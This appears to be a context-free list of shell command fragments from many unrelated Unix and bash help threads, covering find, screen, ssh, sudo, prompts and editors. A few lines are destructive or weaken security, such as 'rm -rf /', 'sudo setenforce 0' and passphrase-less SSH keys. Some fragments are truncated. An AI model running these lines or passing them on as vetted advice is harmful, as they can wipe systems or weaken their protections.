[command1] file exists
[command1] file moved
[command2] file copied
[command2] file emptied
['"${i%.sh}"'] /
sudo -u boudiccas
obnam ...
moo() { true;}
grep -Eoe '^\w+' ~/.functions
!:- !$:s/d/D/
ls -ld /asDfg/qwerty/foo/bar
ls -lD ...
echo !740 | xclip -sel clip
vi filename.sh
:set ff=unix
xargs (GNU findutils) 4.4.2
[0] 0:bash*
diff -r left_dir right_dir
diff <(cat left_file | myfilter) <(cat right_file | myfilter)
export ANOTHER_VAR=$HOME/tr
/home/user1/files/foo 1/this file is called this.mp3
yet another file.mp3
LC_ALL=C ls -lR | gzip > listing.ls-lR.gz
Preferences - Profiles
ssh root@192.168.1.1
Profiles - Open
Edit Session...
Window - Save Window Arrangement
:echo $HOME
cmd.exe /c
VAR=abc command
alias gvim='HOME=/cygdrive/c/Users/Sundar /path/to/gvim.exe'
gvim() { HOME=/cygdrive/c/Users/Sundar /path/to/gvim.exe $1; }
explorer.exe filename.ext
explorer.exe 'C:\Program Files (x86)\Vim\vim73\gvim.exe'
find /data -type f -a -ctime +30 -print0 | xargs --no-run-if-empty -0 rm -f
find /data -type l -a -ctime +30 -print0 | xargs --no-run-if-empty -0 rm -f
find /data -type d -mindepth 1 -print0  | xargs --no-run-if-empty -0 rmdir --ignore-fail-on-non-empty
-printf %p:
-mindepth 1
history | grep -i [phrase]
fs_usage -w
fs_usage -w
-v -1d
grep -o
"([0-9a-zA-Z ]+)"
<a href="http://example.com/Bob"> Bob
<a href="http://example.com/Jim"> Jim
<a href="http://example.com/Steve"> Steve
./scriptname.sh filename.txt
screen -x
grep -c
-type f
-name "*"
echo -ne '\x1B_Hello World\x1B\
Hello World
export PROMPT_COMMAND="set_hardline"
awk '{ cmd = ("date +%R -d @"$1); cmd | getline timestamp; close(cmd); $1=""; print timestamp$0 }' /var/log/squid3/access.log
awk '{timestamp=strftime("%R",$1); $1=""; print timestamp$0}' /var/log/squid3/access.log
chmod +x parse_squid_log
history; !<number>
*Shell Command Output*
C-x h M-| command2 RET
C-x h
M-x function-name RET
*Shell Command Output*
C-h f function-name RET
M-x describe-function RET function-name RET
valter.silva's cron
root cron
git remote add
git push git://host.xz[:port]/path/to/repo.git/
-u origin master
echo "
echo "|"
"(": "()"
-m vi-insert
ssh git@myserver info
ssh git@unclefloserver info
export $PATH
which xargs
ntfs-3g file system
man mount
-d '\n'
sed -e 'N;N;N;N;s/\(.*\)\n\(.*\)\n\(.*\)\n\(.*\)\n\(.*\)/\1\2\3\4\5/'
alias vi
hash -r
brew install vim --override-system-vi
mvim -v
mvim -v
git commit
ssh username@hostname
ssh: Could not resolve hostname myhostname: Name or service not known
cut -sf2 -d' ' list.tab|sed -e 's/\..*/\"/'
awk '$2 {oFS=FS; FS="."; $0=$2; print $1"\""; FS=oFS}' input
'.' < '9'
touch /tmp/scriptname.lock
Program Files\SpeedFan\SFLog(date).csv
-n 1
echo -n
tmux attach
tmux at
[remote] 0:bash
tmux kill-server
tmux attach
export PS1=…
username@hostname path #
git status
git status
sudo chown -R $USER:admin /usr/local
du -Lsbc * | sort -n | awk
ln -s ./test.sh /usr/bin
scp user@remotehost:/
mybashscript login
mybashscript view
[[ "$1" =~ ^(sign|view|save|erase)$ ]];
[ -n "$1" ]
launch "$1" && exit
if launch "$option"; then ...
ln -s
ls ../source/*.bar
ln -s
man ln
shopt -s globstar
$ locale -a
Escape non-ASCII characters
help fg
help bg
rm -rf "$MINECRAFT_PATH/server.log backups/*"
server.log backups
server.log backups
server.log backups
server.log backups/*
rm -rf
mkdir -p
server.log backups
-mindepth 1
file ./*
file -- *
:set paste
:set paste
:set nopaste
:set paste
sh /data/webcam/script.sh > /data/webcam/log.txt 2>&1
'/data/webcam/script.sh > /data/webcam/log.txt 2>&1'
sh -c '/data/webcam/script.sh > /data/webcam/log.txt 2>&1'
$ find -type d -regex '\..+' -exec tar -r {} /media/bjackfly/bkup/bkup.gz \;
find ./target-dir -type d -name '.?*' -prune -o -print0 | tar --null --no-recursion -cvzf backup.tar.gz -T -
find ./target-dir -type d -name '.?*' -prune -o -print0 -exec tar --null --no-recursion -cvzf backup.tar.gz -T {} +
ls -al
man history
ping google
/usr/bin/mysqldump -u username -h localhost database --single-transaction | gzip -9 > database.sql_$DATE.gz
rsync -d
-maxdepth 1
diff --help
Create a backup copy of files before saving
nano -B example1.txt
cp -b example1.txt example2.txt
source ~/.bashrc
. .shcommon
for ((…))
bash: __git_ps1: command not found.
alias su="export REAL_HOME=$HOME && export SWITCHING_TO_SU=true && export PROMPT_COMMAND='source $HOME/.bash_profile; $PROMPT_COMMAND' && su"
tput cols
emacs -nw
exec emacs -nw
#PBS -S
set -x
still < 5
now > 5
notify-send 'a'
export HOME=/tmp
byname - bash - 80x24
System Preferences > Sharing
help compgen
time app.exe > /file/path/file.txt
(time app.exe) > /file/path/file.txt
time > /file/path/file.txt app.exe
bash: -o command not found
( )
rm -rf /*
rm *
rm * .txt
rm -rf /
alias rm=rm -i --preserve-root
newdirmask=$(date +%Y%m%d''%H%M%S)
mkdir /home/$newdirmask
sudo -v
sudo -v
sudo -v
sudo -k
sudo -S
./echopw | sudo -S
_sysstop        ALL=(ALL) NOPASSWD:/sbin/shutdown -h*, SETENV: ALL
ssh-keygen -t rsa -vvv -f mykey -N "" -C "mykey" | tee mykey.fng
-N ""
~$( echo username-just-created )/.ssh/authorized_keys*
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAA... Optional-comment-after-the-space
ssh -i ~/keys/privkey-file _sysstop@localhost
-i filename
command="sudo /sbin/shutdown -hp now Shutdown initiated with SSH by \\"$USER\\" CONN rem/lcl=\\"$SSH_CONNECTION\\" CLI rem/lcl=\\"$SSH_CLIENT\\" CMD=\\"$SSH_ORIGINAL_COMMAND\\"",no-agent-forwarding,no-port-forwarding,no-X11-forwarding ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAA... Optional-comment-after-the-space
find -exec something-that-calls-find.sh
-exec rm -rf {}
-predicates -actions -or
xargs rm -r
-exec rm -r {} \;
shell script
echo ${0##*.}
-maxdepth 1
awk '{print $2, $1}'
elinks -auto-submit http://somesite.com
timeout 1m elinks -auto-submit http://somesite.com &
stty erase ^H
stty erase ^?
stty erase [whatever]
VT100.backarrowKey: false
builtin cd args
command test -n xyz
enable [-n] cmd
enable -a
$ set_compiler
<set-property name="user.agent" value="safari" />
git commit -am "a comm
/Applications/Sublime\ Text\ 2.app/Contents/SharedSupport/bin/subl
sudo ln -s "/Applications/Sublime\ Text\ 2.app/Contents/SharedSupport/bin/subl" /usr/local/bin/subl
echo $PATH
-bash: subl: command not found
ls -la
ls -l http://www.some_site.com/some_directory/
rm ??????
ls -log /some/directory| awk '{print $6","$4" "$5}' | tr "\n" ";"
info ls
svn diff
svn diff > whatever.diff
less whatever.diff
less -R
sed 's/\x1b\[[0-9]*m//g'
cdp=$[$cdp + $dcpd]
kate &
nohup kate &
screen -r
shopt -s huponexit
help wait
man script
chmod a+x /usr/local/rvm/scripts/initialize
AllowOverride None
AllowOverride all
AllowOverride None
<Directory /var/www/>
set shell=bash-rcc
ls -aFld ${path}*
shopt -s nocaseglob
rsync [options] SRC DEST
cd DEST
net use J: \\server\share
ls -al
ls -altr
head -n 5 < foo.sh
head -n 5 foo.sh
sleep 3600
for ((i=1;i<100000000;++i)); do :; done
command="/usr/bin/rrsync /foo/bar/baz" ssh-rsa AAAA[...]
zeus start
zeus server
write text
/usr/bin/bash -lic "/home/userdude/scripts/scrypty.sh param1 param2"
Shortcut Key:
screen -X get-window-number
set -e
set -e
SHELL BUILTIN COMMANDS
set +o
shopt -p
git log --pretty=format:...
git hist
./column_ansi.sh [--options]
source ./column_ansi.sh
set -x
set -v
dig +noall +answer -x <IP>
wget -O -
curl -s
sudo apt-get install
Ctrl + L
history | tail -3
shopt -s histappend; export PROMPT_COMMAND='history -a';'
history -d offset
!! -rf
man bash
!!:0 -rf !*
rm -rf !*
!! -rf
zcat -f
<( test && do_this_command_as_input || cat this_is_the_input )
<( )
if then else
useradd: cannot create directory /srv/data/git
mkdir -p /srv/data/git
mkdir -p /srv/data
... --create-dir --home-dir /src/data/git ...
alias ls=ls_filter.bat $*
failed to stat «/home/zapis/liveop/*_205_*»: No such file or directory
rm -rf
No such file or directory
rm file
rm "testfile "
rm testfile\
find /path/to/search-name  'SomeFilePattern*'  -print0 | some_command
ls -i
find -inum
fdupes -rn /
movetofolder *ovie*
for num in {1..9}; do touch file-$num.txt; done
for name in $(eval ls | cut -b 1-6); do mkdir $name; done
for name in $(eval ls | grep -e ".txt" | cut -b 1-6); do mv $name.txt $name/$name.txt; done
defaults read
type -d
-mindepth 1
-type f
-mindepth 1 -maxdepth 1
man zip
find … -print0 | while IFS= read -r -d '' file
find … | while read file
find "$dir" -maxdepth 1 -type f | read f
[[ $iuser == "root" ]] && continue
ls -1
ctl-y ctl-y ! ! esc ^
"ffmpeg -i $FILENAME $resolutions"
set -o
set -o emacs
set +o vi
ps -p $$
stty -a
stty -a
shopt -s checkwinsize
shopt -p
sudo su
su - <user>
sudo "su commands"
sudo "ls /home"
sudo su
sudo su -c "ls /tmp"
sudo su -c "ls /tmp/; whoami"
echo $?
notexistingcommand; ssh vm "echo $?"
export var=123; ssh vm "echo $var"
ssh vm "nonexistentcmd; echo \$?"
ssh vm 'nonexistentcmd; echo $?'
rm -r /path_to_directory_to_remove
man stdbuf
:split todo.txt
ssh -tt user@machine 'cd /thedir; nohup ant clean test 2>&1 | mail -s "The cleanup was completed." your-email@exmaple.com'
alias gb="git branch --verbose"
git a
find /folder_to_search_into/ -type f -size -2k
find /folder_to_search_into/ -type f -size -2048c
-size 2048c
-size 2k
-size -2048c
-size -2k
man bash
setenv PATH ~/bin:/usr/local/bin:/usr/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/libexec:/usr/texbin
launchctl < /etc/launchd.conf; sudo launchctl < /etc/launchd.conf
chmod -R xx4 /home/mDB/admin/KNUCKLES/dbs/
 HISTFILESIZE=1000000000 HISTSIZE=1000000
cd ~/
touch .bash_profile
open -e .bash_profile
HISTFILESIZE=1000000000 HISTSIZE=1000000
help history
./get_new_youtube.sh youtube_tedx.conf
youtube-dl -tca list.all && rm list.all
service --status-all
[ ? ]
[ - ]
[ + ]
service --status-all | sort
service --status-all
[ + ]
[ - ]
[ ? ]
ls -1
man xargs
{} Hello World
rm *(*)*
sh: syntax error near unexpected token '('
-maxdepth 1
-type f
[ -e $ARTIFACTS ]
[ foobar ]
help set
test -e
[[ … ]]
[ … ]
-d "$SOME_UNSET_VAR"
-d ""
rm -rf $ARTIFACTS
$(echo "$concat" | sed -e 's/^concat://' -e 's/|$//' -e 's/|/\n/g')
find /home/jhvisser/bin/Streamripper_rips -name '*.aac' -mtime -1 -delete
sudo curlftpfs ftp.example.com /mnt/ftp/ -o user=username:password,allow_other
:map ,t :w\|:!quizzical tests.sh <CR>
echo $-
SHELL BUILTIN COMMANDS
ps aux | grep bash
login -pfl danielbeck /bin/bash -c exec -la bash /bin/bash
login -pf danielbeck
CTRL-a + H
CTRL + a
SHIFT + H
which jav
java -version
head $"$numb"
head $'\$numb\'
echo "${@[$bar]}"
"$1" "$2" "$3" ...
i=1, 2, 3, 4, 5
bash -i
ssh -t
mount -tdevpts pts /dev/pts/
ssh foo@bar.org 'mount -tdevpts pts /dev/pts/'
shell script
unix shell
bash shell
Bash command
id -Gn
at &> /dev/null && echo "Running as admin" || echo "NOT running as admin"
id -G | grep -qE '\<(544|0)\>'
ls -Fl
info ls
sh -c
$(basename {} .ext)
directory_where_the files_are
for x in *.ext
        convert -input "$x" -output $(basename "$x" .ext).out
for x in /path/to/folder/*.ext
        convert -input "$x" -output $(basename "$x" .ext).out
8086 relocatable (Microsoft)
echo $TERM
cd /vol; ls -R
ls -R /vol
screen yourcommand
screen -DR
ls FileDirectory/Input_* | parallel -j 8 --workdir $PWD ./Executable {}
screen sh -c 'ls FileDirectory/Input_* | parallel -j 8 --workdir $PWD ./Executable {}'
screen ./runjob
update table ...
echo $PS1
echo $-
bash -i
bash -l
bash -l
bash --rcfile <(echo "PS1=$PS1save") -i
bash -i
ps aux | grep firefox
firefox ; pid=$!
firefox & pid=$!
firefox & sleep 12; kill $!
aptget install timeout
timeout -k 3m 14s firefox
perl -e "alarm 10; exec @ARGV" "firefox"
$COMMAND 2>&1 >/dev/null & WPID=$!; sleep $TIMEOUT && kill $! & KPID=$!; wait $WPID
Apple Menu > System Preferences > Sharing
Computer Name
hostname <myhostname>
man hostname
scutil --set HostName <myhostname>
bash -c 'echo -e "\nserver.id=$1" >> file.properties'
sh script.sh ABC
shopt -s extglob
shopt -u extglob
stat=Deferred: Connection timed out with backup-mx.mcs.de.
shopt -s extglob
set show-all-if-ambiguous on
Display all ... possibilities? (y or n)
make -j 20
echo -n
tr '\n' ','
jhead -n%Y%m%d-%H%M%S *.jpg
= $PATH
echo $PATH
android list targets
xxx ${BASH_COMMAND}
ps aux | grep minecraft_server.jar
ps aux | grep minecraft_server.jar | awk '{print $2}'
-regextype <whatever>
find: unknown predicate '-<whatever>'
find: paths must precede expression: <wherever>
-regextype posix-awk
-regextype posix-extended
find "$@"
set --
set +xe
printf '\033Ptmux;whatever\033'
Ubuntu 12.04
bash 4.2.25(1)-release
test test2
screen -dm
screen -ls
screen -r <session number>
screen -dmS session1 vi xxx
screen -r session1
screen -r session2
command1 ; command2 &
cd %
export PS1="IP: $(ip addr show dev eth0 | grep "inet " | cut -d" " -f6) #"
facter ipaddress_eth0
export PS1="IP: $(facter ipaddress_eth0) #
source ~/.bashrc
rsync -avzhe ssh /path/to/file user@server:/path/to/destination
gvim -f
gvim -f
gvim -f
[matroska,webm @ 0x27bbee0] Read error
./ffmpeg -threads 4 -r 29.97 -f image2 -i "${OUTPUTFILE}-frames"/frame%d.png \ -i "${OUTPUTFILE}.mkv" -c:a copy \ -map 0:0 -map 1:0 -f MP4 -y "${OUTPUTFILE}.mkv"
./ffmpeg -threads 4 -f image2 -i "${OUTPUTFILE}-frames"/frame%d.png -r 29.97 \ -i "${OUTPUTFILE}.mkv" -c:a copy \ -map 0:0 -map 1:0 -f MP4 -y "${OUTPUTFILE}.mkv"
./ffmpeg -threads 4 \ -i concat:"${OUTPUTFILE}-intro.mkv"\|"${OUTPUTFILE}.mkv"\|"${OUTPUTFILE}-exit.mkv" \ -y "${FINALOUTPUT}.mkv"
ffmpeg -f concat -i mylist.txt -c copy output
ffmpeg -loop 1 -i "${OUTPUTFILE}-intro.png" -q:v 1 -r 29.97 -t ${LOGOLENGTH} -y -f MP4 "${OUTPUTFILE}-logo1.mkv"
screen -r
Ctr-a [
<commamd> | less
$(printf "%s%02d" $HOSTNAME $i)
(( ))
./scriptname *.rb
./scriptname .
chmod a+x scriptname
Get Info
Open in Low Resolution
Prevent App Nap
osascript -e 'tell app "Finder" to info for (POSIX file "/Applications/Application.app")'
system.method.set_key = event.download.finished,create_torrent,"execute=~/s.sh,$d.get_name="
ls --color=auto
alias ls='ls $LS_OPTIONS '
echo ...
source .bash_profile
(time myprocess) &> outputfile.txt
bash: $'\302\226curl': command not found
$ curl -v -F foobar
unix2dos ~/.bash_profile
sudo chmod ugo+x
post-up <path/to/script.sh>
-type f
\! -name '.*'
echo $FOO
bash -i
bash -c
Ubuntu 12.04.3 LTS
Screen version 4.00.03jw4 (FAU) 2-May-06
host_u(1:bash)sds ~
CentOS release 6.3 (Final)
Screen version 4.00.03 (FAU) 23-Oct-06
termcapinfo xterm* 'hs:ts=\E]0;:fs=\007:ds=\E]0;screen\007'
find ~ -iname '.htaccess' -exec chflags nohidden {} \;
date --help
date --set='60 seconds ago'
'64 seconds ago'
grep tomcat7 /etc/passwd
su -s /bin/bash
su tomcat7 -c id
dir1/ dir2/ dir3/
dir1 dir2 dir3
find . -type d -maxdepth 1
echo "What programme do you want to see?"
apt-cache show foo|grep -i description -A 8
date +%H:%M:%S:%N
date --help
tab=$(osascript -e 'tell app "Terminal" to do script "uptime"');osascript -e 'tell app "Terminal" to do script "uptime" in '"$tab"
in window 1
osascript -e 'tell app "Terminal" to do script "uptime"';osascript -e 'tell app "Terminal" to do script "uptime" in window 1'
   sed '/Sometexts/ r newtext.txt' old.txt > new.txt 
-printf %G | sort | uniq
curl -z pci.ids --remote-time --silent -f -L -O \ http://pciids.sourceforge.net/v2.2/pci.ids
Control + X
sudo rm /etc/paths.d/git
hour=$(date +%H);[[ $(date +%M) -ge 30 ]]&&let hour++;[[ $hour = 24 ]]&&hour=0;hour=$(printf %02d $hour);for f in *.txt;do mv "$f" "${f%.txt}_$hour.txt";done
expr 5 + 10
expr $x + 10
rsync -av /res/output user@remotehost:/where/you/want/them
git co master
git pull
ps -Af
ps -Af
ps -U <username>
ps -Af | grep -v 'root'
ps -Af
ps -Af
ps -Af | grep -v root
ps -Af | awk '$1 != "root" {print $0}'
ps --deselect -U root
-U root
arrow up
bash 4.0+
chmod 700 script
chown root:wheel script
foo: No such file or directory
yourcommand &>filename
./myscript &> /dev/null
your_script 2> /dev/null
"one two three"
cannot find name for group ID 387
getgroups(7, [106, 513, 515, 516, 519, 520, 2503]) = 7
-a value
expect eof
import ex25
export PATH=/usr/local/bin:$PATH
export PATH=/usr/local/bin:$PATH
go get
echo $GOPATH
export FOO
export FOO=bar
curl http://anysite.com/tarball.tar.gz | tar xz
cd *
apt-get install mypackage
$(!! |& tail -1)
$(fc -ln -1)
$(fc -ln -1) |& tail -1
tail -1
$(!! |& tail -1)
$(fc -ln -1)
-name 'img*.jpg'
for j in $2/*
find $2 -type f -name $i | while
help source
/etc/init.d/put_ubuntu_users: 14: /etc/init.d/put_ubuntu_users: cannot open ~/data.txt: No such file
setuid myuser
sudo yum install ncurses-devel
sudo rm -fR autom4te.cache
alias make='colormake'
sudo sh filename.sh
sudo update-alternatives --config java
java -version
update alternatives
java -version
bin/java -version
java version "1.7.0_10"
find . -name 'javax*.jar'
Match User
tail -f
exit 1
python -c 'from django.conf import settings; print settings.MEDIA_ROOT'
pyt -c [...]
pyt -c "print 'foo'"
python -c "print 'foo'"
echo $@
python -c "print 'foo'"
print 'foo'
pyt -c "print 'foo'"
python $@
python -c print 'foo'
pyt -c "print 'foo'"
python "$@"
python -c "print 'foo'"
wc -l
-amin n
-atime n
find -atime -30
find -ctime +5
find -mtime +2 -31
-exec grep {} \;
{} \;
ps -e
cd /;ls;echo hi | less
du -h
git bash
git bash
cd ../
screen -S sessionname -X command
-X screen top
-X screen sh -c 'ls; bash'
supercommandlinetool create index
@reboot /path/to/file
man newgrp
man 5 passwd
man 5 group
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:
man 1 bash
some_cmd > some_file 2>&1 &
System Preferences
App Shortcuts
Page Up
(cd /vol/mynfs; ls)
ls -la /vol/mynfs/.
passwordless login
echo $HOME
for i in {1..10}; do YourCommand; done
for i in {1..5}; do ls -l; done
repeat 5 ./foo
cd ../../../
ls .
ls ./
ls ..
ls ../
bash: .: filename argument required
mywidget.title = "idle" | awesome-client
man sh
[root@myserver ~]# 
echo $PS1
[\u@\h \W]\$
PS1="[\u@\h \W]\$"
[root@myserver ~]$
sudo su
PS1="[\u@\h \W]\$ "
PS1 <- "[\u@\h \W]$ "
PS1 <- "[\u@\h \W]\$ "
PS1='[\u@\h \W]\$ '
man bash
grep -Eo
<<< '<input_string>'
echo '<input_string>' |
sed 's/<br\ *\/>/\n/g' html_file | grep myURL.net
<br />
sed "s/http/\nhttp/g" your.html | sed -n "s#\(.*\)\(http.*//[a-Z0-9./-]*[^a-Z/]\)\(.*\)#\2#p;" | grep IWANTthis
apt-get install zutils
zgrep -rH myword .
sift -z foo
sudo setenforce 0
sudo setenforce 1
mount --bind
Permission denied
Permission denied: /home/liveuser/alias was mounted with noexec
ulimit -u
setrlimit(RLIMIT_NPROC, ...)
w | grep 'sshd:'
f | tee -a logfile
zsh% myfiles=(myfile_v*(n)); lastfile="${myfiles[-1]}"; unset myfiles
group 2 of toolbar 1
group 1 of toolbar 1
group 1 of toolbar 1
set pid to value of text field 1 of aProcess
man bash
Server Name is 2
if [ $Server_Name=1 ];
if [[ "$Server_Name" == 1 ]]; then
if [ $Server_Name=1 ]; then
if [[ "$Server_Name" -eq 1 ]]; then
. ~/.bashrc
function name() { :; }
name() { :; }
set bg=dark
set t_Co=256
tail -f
ulimit -n 10000
Process Completed
echo $PATH
cat /etc/paths
ls -l /etc/paths.d/
. .profile
awk: warning: escape sequence \( treated as plain (
ps -aux
~/MovieSubtitles/We Own The Night.zip
~/SeriesSubtitles/Masters of Sex  S01E11 - Phallic Victories.zip
echo $?
cat /proc/PID/limits
ps ax
gdb -p PID
Saved corefile core.15113
strings core.15113 > my_script.sh
cat $FD > /tmp/yourscript.sh
echo -e
CTRL + V
echo -e "\nBackup of ${i%%/} successfull" >> $logs/backups.log
J:\To_Sort\Selected-Dir-01\photos\Foley_At_141_-_14-04-2009\small-psd\DSC_7975 copy.psd
J:\To_Sort\photos\Foley_At_141_-_14-04-2009\small-psd\DSC_7975 copy.psd
1 2 3
java --jar {java program name}
source ~/.bash_profile
source ~/.bash_profile
man bash
set -x
bash --login
bash --login
window manager
bash script.sh
sh script.sh
setopt PROMPT_SUBST
chsh -s /bin/tcsh
./exec < param.txt
|| exit
tens | head
-d ' '
-f 3
foo=( $(SayStuff) ) 
.* 
Watermelons and cucumbers
tput cols
ls -1 .
ls -1 ~/.shortcuts | xargs -I {} alias {}="'cd -P ~/.shortcuts/{}'"
alias ll='ls -l'
. ~/.bash_aliases
xargs -t
JohnBatasiPhone:~ AlbertRenshaw$
3 * 60 = 180 seconds = 
Settings -> Configuration -> SSH
SSH settings
SSH keepalive
watch 'mkdir temp; ls -l temp; rmdir temp
./script.sh "Fil*"
ls sample/Fil*
!! anotherfile
!-2 newarguments
ps aux
grep ls
grep ls
ps aux
ps aux
grep ls
grep ls
ps aux
find . -type f | grep -i decor *
find . -type f -exec grep decor {} \;
find . -type f | xargs -i grep decor {}
sleep 60
-type fl
find -type l -name node-dev -exec ls -lah {} + -o -type f -name node-dev -exec ls -lah {} +
find -type lf -name node-dev -exec ls -lah {} +
source .bash_profile
" ... "
“ ... ”
-n1 echo
grep command
cd ..
cd (directory)
ls YourSubdirectory
cd .. && cd -
cd ..; cd -
cd $PWD
cd .
rm *.swp
rm: *.swp: No such file or directory
find . -type f -name "*.swp" -exec rm -f {} \;
rm -f .*.swp
xargs -a FILE -d '\n' -L 1 -r COMMAND
-L1 -r
while read
if [ $t1 -eq 3 ]
Shells open with:
/usr/bin/login -f -l whmcclos bash -i
ls -a
"This folder has \$(/bin/ls -1 | /usr/bin/wc -l | /bin/sed 's: ::g') files"
du -sh .
/bin/ls -lah | /bin/grep -m 1 total
Macro 01
cat >> all.java file1 file2 file3 ...
man find
Alt + .
Esc + .
iTerm2 > Settings > Profiles > Keys > Left Option key > Esc+
gem install berkshelf
stty sane
foo bar
line[4]command=sh -c "service apache2 start"
Bad substitution
bash -c "…"
bash -c "curl | tee test.txt; echo \${PIPESTATUS[0]}"
bash -c 'curl | tee test.txt; echo ${PIPESTATUS[0]}'
lsd *.sh
lsd *.wav
lsd *.wav
"eel.txt", "fox.txt"
"ls *"
alias ls='/some...path/ls2.sh'
$ git push
$ alias git="$HOME/bin/git"
man man
man -B SomeBrowser
man  [-acdfFhkKtwW]
mv "$files" "${files%.cpp}.C"
my file.cpp
umask 0077
echo $rootpass
dothis "my&rootpa$$"
source test.sh
source test.sh
echo anything
line 1 line 2 line 3 DONE
bash -c
xargs -0
set -o vi
man readline
vi b<TAB>
-name "lib*"
echo "$(curl -s http://ipecho.net/plain)"
cd ..
[[ -d "${DIR}" ]]
-l <len> | -len <len>
-n <len>
-l <len>
-l 10
au VimLeave * :!clear
man test
man bash
urxvt -e 'tmux'
ls -la
man expect
export NMON=cmt
find /mnt/capture/PPO/ -maxdepth 1 -type f -name "*.pcap" -print0 | xargs -0 ls -lt | tail -5 | awk '{print $9}'
while true
supvervisorctl tmuxservice restart
scp -p remote:*.pattern curdir
wc -l
type nvm
man whereis
man which
locate nvm
export PATH="$PATH:~/foo/bin"
man bash
eval echo
echo $TEST_HOME
which -a git
command; bash
export PS1='foo'; /usr/bin/bash
ls -a
ls ..
ls -a .
ls -a ../a
touch b
touch .
rmdir ../a
less +F
Received ^C signal, shutting down
Received ^C signal, shutting down
stty intr ^G
-h' option is given, the job is not removed from the table, but is marked so that SIGHUP is not sent to the job if the shell receives a SIGHUP. If jobspec is not present, and neither the
-r' option is supplied, the current job is used. If no jobspec is supplied, the
process group
cp -rf --backup=t patch* www/
set -o pipefail; gzip -dc file.gz | xz > file.xz && rm file.gz
set -e
set -e
stty sane
source /etc/profile
mvn --version
sudo mvn --version
sudo: mvn: command not found
sudo su -
mvn --version
su -
man bash
Defaults env_keep
env "PATH=$PATH"
sudo visudo
read -e
read -e
man rlwrap
read -e
export =/Users/full/path/to/script/config
find /Volumes/1/ /Volumes/2/ -not -empty -type f -printf "%D\t%s\t%f\n" | sort -t$'\t' -k2 -n | uniq -uf1 | sort
find /Volumes/1/ /Volumes/2/ -type f -printf "%f\n" | sort | uniq -u
find /Volumes/1/ /Volumes/2/ -type f -printf "%s-%f\n" | sort | uniq -u
bjobs -a
bjobs -l <jobid>
ssh danger@somehost
2014-01-30 05:04:27 GMT
date -d "2014-01-30 05:04:27 GMT"
Thu Jan 30 16:04:27 EST 2014
2014-01-30 05:04:27 GMT
date -d
date -f
wget <the-url-to-download>
shopt -s dotglob
MyMacbook: ~$
cd ~/Desktop
MyMacbook: ~Desktop $
"chsh -s /bin/tcsh
72DFBF5B A0DF5BE9
\( [^_]\+ \)
vgrename /dev/mapper/oldVG /dev/mapper/newVG
New volume group name "StoreVG/BackupLV" is invalid
Volume group name BACKUP/StoreVG has invalid characters
grep -C 2 "TARGET" inputfile
rm -r -i
mindepth 1
maxdepth 1
find /path -type d -exec rm -rf '{}' \;
ls -alF
virtualhost.sh my_virtual_host_name
virtualhost.sh --delete my_virtual_host_name
help read
man bash
mv -i
screen -D -RR -x ... (workstuff)
test -n "${NO_ALIASES+D}" && return 0
diff -r -i Root Branch
cp spreadsheet{700..999}.xls folder
echo $?
echo $?
sed -i 's/0/correct/g' /"file"
cd: No home directory.
env -i zsh
env -i zsh
HOME <S>
zsh -f
OLDPWD' =
-exec sh -c "$dropboxtool move $dropbox/$(basename {}) $dropboxarchive" \;
sh -c
sh -c
sh -c
$( )
sh -c
diff -brief -rb dir1 dir2
diff -qr dir1 dir2 | sort
Only in dir2: file3
-iname "*.flv"
-iname "*.flv"
evince filename.pdf
$ evince filename.pdf &> /dev/null  &
&> /dev/null
:help ^[
Esc k CR
diff <(bind -p -m vi-move) <(bind -p -m vi-command)
editing-mode vi
set -o vi
which sh
sudo su user <<EOF
sudo -kS
grep -rnl * --mmap -F -e "Ai9LbaFz7lC13SwzDxAYT72vwA"
s1 s2 s3 s4
perl -lne
man terminfo
sudo !!
sudo !!
sudo !!
sudo 
sudo 
<command> !$
sudo !!
$[ $a || $b || $c ]
$[ 0|| 0 || 0 ]
$[ $a || $b || $c ]
set -e
echo mv …
C-x d
C-x C-q
C-c C-c
set -o emacs
unzip ~/path/to/my/ZipFile.zip -d ~/path/to/my/destination/
cd <path>/zipfolder; zip ZipFile.zip *
mv ~/path/to/my/destination/zipfolder/* ~/path/to/my/destination/
rm -f ~/path/to/my/destination/zipfolder
ls -l
man ls
IFS="AA" ls -l
ls -n
man bash
echo {}
ls -l {}
sudo find / -type d -name 'yt' -exec echo {} \;
sudo find / -type d -name 'yt' -exec ls -l {} \;
ps -fT pid
[\u@\h \W]\$
man bash
sort ~/.bash_history | uniq -u
:sort u
ls -lh | tail -n +2
ls -ltrh
ls -lh
ls -lh | tail -n +2
tail -n +2
ls -dlh *
Invisible.vbs "Kill.vbs ME.exe"
zle -N example
bindkey '^M' example
ssh user@192.168.1.2
man zshzle
-s in-string out-string ...
ssh user@192.168.1.2
rails c
SECRET='abcd123' rails c
source .bashrc
$ sed -i 's/maxmemory.*/maxmemory 26gb/' /some/file/some/where.txt
man date
equery list "*"
equery list "*" | grep "~"
equery list "*" &> eql.txt
equery -N
equery -N list '*' | grep '~'
fdisk -l
parted -l
cat /proc/partitions
stty -a
stty -a
stty -a
stty sane
'My\\\ Name'
as b1
/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/as: fatal error in /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/../libexec/as/x86_64/as
GNU/Linux 2.6.18
cut -d ':' -f3
cut -d: -f3-
dmesg | tail -f
dpkg was interrupted, you must manually run 'sudo dpkg --configure -a' to correct the problem.
root: my-user-name
/usr/bin/apt-get update -y
sudo -i
env -i /bin/bash --noprofile --norc
dog cat bird whale
dog dog cat cat bird bird whale whale
strict 'vars'
foo="dog cat bird whale"
-n 0
-n +1
set bell-style none
alias foo='ls'
/working/directory $
$ echo -e "\e[8;2;20t"
apt-get install xdotool
xdotool search Konsole
/dir/file1 /dir/file2 /dir/foo /dir/bar
#!/usr/bin/env bash
export PATH="~/bin:${PATH}"
lget https://github.com/nwgat/scripts/raw/master/lftp.sh
bash: make: command not found
compgen -c
uname -a
hash -r
hash -r
chmod +x file
chmod u=rwx,go=r file
cd usr/local
cd /
cd usr/local
sudo apt-get install xsel
swapon -s
wc -l
python test.py
$ bash job.sh
tr -d '\r'
': [Errno 2]...
command | grep -v "JavaScript strict warning"
JavaScript strict warning
ps -T PID
ps -T
Debian 3.2.35-2 x86_64 GNU/Linux
procps-ng version 3.3.3
ps -acxef -o pid,time,command
ps -axef -o pid,time,command
man zshexpn
print -l
